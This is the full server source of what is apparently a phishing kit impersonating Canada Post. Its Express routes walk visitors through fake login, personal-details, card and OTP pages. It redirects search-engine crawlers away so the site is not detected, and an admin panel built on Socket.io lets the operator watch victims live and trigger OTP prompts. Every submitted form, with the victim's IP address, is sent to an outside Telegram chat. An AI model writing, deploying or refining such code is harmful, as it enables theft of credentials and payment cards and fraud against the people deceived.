// ====================
// Module Imports
// ====================
const express = require('express');
const { createServer } = require('node:http');
const bodyParser = require('body-parser');
const { join } = require('node:path');
const { Server } = require('socket.io');
const fs = require('fs');
let fetch;
const https = require('https');
const http = require(`http`);
const TelegramBot = require('node-telegram-bot-api');
const session = require('express-session');
const crypto = require('crypto');
const sessionStore = new Map();

(async () => {
    fetch = (await import('node-fetch')).default;
})();

require('dotenv').config();

// ====================
// Configuration
// ====================
const app = express();

const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY;
const token = process.env.TELEGRAM_BOT_API_KEY;
const chatId = process.env.TELEGRAM_CHAT_ID;
const adminKey = process.env.ADMIN_KEY;
const bot = new TelegramBot(token, { polling: true });


// Configure session middleware
const sessionMiddleware = session({
    secret: "6LdI0PYoAAAAAN0RS1L3WZhLYqr8YX3jCwM2umEx", // replace with your secret key
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
});

app.use(sessionMiddleware);

const server = createServer(app);
const io = new Server(server);

const botList = [
    'Googlebot',
    'googlebot-image',
    'googlebot-mobile',
    'MSNBot',
    'Slurp',
    'Teoma',
    'Gigabot',
    'Robozilla',
    'Nutch',
    'ia_archiver',
    'archive.org_bot',
    'baiduspider',
    'naverbot',
    'yeti',
    'yahoo-mmcrawler',
    'psbot',
    'yahoo-blogs/v3.9',
    'AhrefsBot',
    'MJ12bot',
    'Majestic-12',
    'Majestic-SEO',
    'DSearch',
    'Rogerbot',
    'SemrushBot',
    'BLEXBot',
    'ScoutJet',
    'SearchmetricsBot',
    'BacklinkCrawler',
    'Exabot',
    'spbot',
    'linkdexbot',
    'Lipperhey Spider',
    'SEOkicks-Robot',
    'sistrix',
    // ... Add all the bots from your list
];

const redirectBots = (req, res, next) => {
    const userAgent = req.get('User-Agent');
    if (userAgent) {
        const isBot = botList.some(botUserAgent => userAgent.includes(botUserAgent));
        if (isBot) {
            return res.redirect('https://www.google.com');
        }
    }
    next();
};

const checkRecaptchaSession = (req, res, next) => {

    if (req.session.recaptchaVerified) {
        next();
    } else {
        res.status(403).send('Access denied. Please complete the reCAPTCHA.');
    }
};

const checkAdminSession = (req, res, next) => {

    if (req.session.isAdminVerified) {
        next();
    } else {
        res.sendFile(join(__dirname, '/misc/403/page.html'));
    }
};

// Middleware to verify Admin response
const verifyAdmin = (req, res, next) => {

    const adminKeyInput = req.body['admin-key'];

    // Check if the provided key matches the stored key
    if (adminKeyInput === adminKey) {
        req.session.isAdminVerified = true;

        next(); // Admin key is correct, proceed to the next middleware/route handler
    } else {
        // Optionally, you could log this attempt or implement rate-limiting to prevent brute force attacks
        res.sendFile(join(__dirname, '/misc/403/page.html'));
    }
    
};


// Middleware to verify reCAPTCHA response
const verifyRecaptcha = (req, res, next) => {
    const recaptchaResponse = req.body['g-recaptcha-response'];

    // Verify URL
    const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET_KEY}&response=${recaptchaResponse}`;

    fetch(verifyUrl, { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                req.session.recaptchaVerified = true;

                next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
            } else {
                res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
            }
        })
        .catch(error => {
            res.status(500).send('Error in reCAPTCHA verification, try again later.');
        });
};

// Use this middleware in your app before your routes
app.use(redirectBots);


// ====================
// Middleware
// ====================
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(join(__dirname, '/captcha/page.html'));
    //res.sendFile(join(__dirname, '/cp/details/page.html'));
});

app.post('/canada-post', verifyRecaptcha, (req, res) => {
    // At this point, the reCAPTCHA was successful, and you can handle the form submission.
    // Redirect the user to the desired page after form submission and reCAPTCHA verification
    res.sendFile(join(__dirname, '/cp/start/page.html'));
});

app.get('/details', checkRecaptchaSession, (req, res) => {
    res.sendFile(join(__dirname, '/cp/details/page.html'));
});

app.get('/card', checkRecaptchaSession, (req, res) => {
    res.sendFile(join(__dirname, '/cp/card/page.html'));
});

app.get('/otp', checkRecaptchaSession, (req, res) => {
    res.sendFile(join(__dirname, '/cp/otp/page.html'));
});

app.get('/loading', checkRecaptchaSession, (req, res) => {
    res.sendFile(join(__dirname, '/cp/loading/page.html'));
});


app.get('/finish', checkRecaptchaSession, (req, res) => {
    res.sendFile(join(__dirname, '/cp/finish/page.html'));
});

app.get('/admin', (req, res) => {
    if (req.session.isAdminVerified) {
         res.sendFile(join(__dirname, '/admin/panel/page.html'));
    } else {
        res.sendFile(join(__dirname, '/admin/login/page.html'));
    }
    
});


app.post('/admin/verify', verifyAdmin, (req, res) => {
    // If this route is called, verifyAdmin has already passed
    res.sendFile(join(__dirname, '/admin/panel/page.html')); 
});

app.get('/admin/panel', checkAdminSession, (req, res) => {
    res.sendFile(join(__dirname, '/admin/panel/page.html'));
});

// ====================
// Socket Handling
// ====================


io.on('connection', (socket, req) => {
  let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    userIP = userIP.split(',')[0].trim();
    
    socket.join(userIP);

    // Directly update sessionStore
    if (!sessionStore.has(userIP)) {
        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp:false });
    } else {
        let userDetails = sessionStore.get(userIP);
        userDetails.status = 'actif';
        sessionStore.set(userIP, userDetails);
    }
    io.emit('join', Array.from(sessionStore.entries()));

    socket.on('pageandstage', (data) => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.page = data.page;
            userDetails.stage = data.stage;
            sessionStore.set(userIP, userDetails);
        }
        io.emit('join', Array.from(sessionStore.entries()));
    });

   socket.on('getUserData', () => {
    io.emit('setUserData', Array.from(sessionStore.entries()));
});

    socket.on('sendOTP', (data) => {
        io.to(data.ip).emit('OTP', {otp:true})
    })

    
    socket.on('submit', (data) => {
        if (sessionStore.has(userIP)) {
        let userDetails = sessionStore.get(userIP);
            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP) {
            userDetails.getUserDataLogin = {};
                userDetails.getUserDataDetails = {};
                userDetails.getUserDataCard = {};
                userDetails.getUserDataOTP = {};
        }
        if(userDetails.stage == 'Login'){
            userDetails.getUserDataLogin = data
            console.log('login')
        } else if(userDetails.stage == 'Details'){
            userDetails.getUserDataDetails = data
             console.log('Details')
        } else if(userDetails.stage == 'Card'){
            userDetails.getUserDataCard = data
            console.log('Card')
        } else if(userDetails.stage == 'OTP'){
            userDetails.getUserDataOTP = data
            console.log('OTP')
        } 
            
        sessionStore.set(userIP, userDetails);
        io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
    }
        let user = data
        user.ip = userIP
           // Additional logic for sending a message via Telegram bot
        let message = JSON.stringify(user, null, 2);
        bot.sendMessage(chatId, message);
       
        //console.log(data)
    })

  socket.on('disconnect', () => {
        if (sessionStore.has(userIP)) {
            let userDetails = sessionStore.get(userIP);
            userDetails.status = 'inactif';
            sessionStore.set(userIP, userDetails);
            io.emit('leave', Array.from(sessionStore.entries()));
        }
    });

});

// ====================
// Server Startup
// ====================

server.listen(80, () => {
    console.log('HTTPS server running on port 80');
});
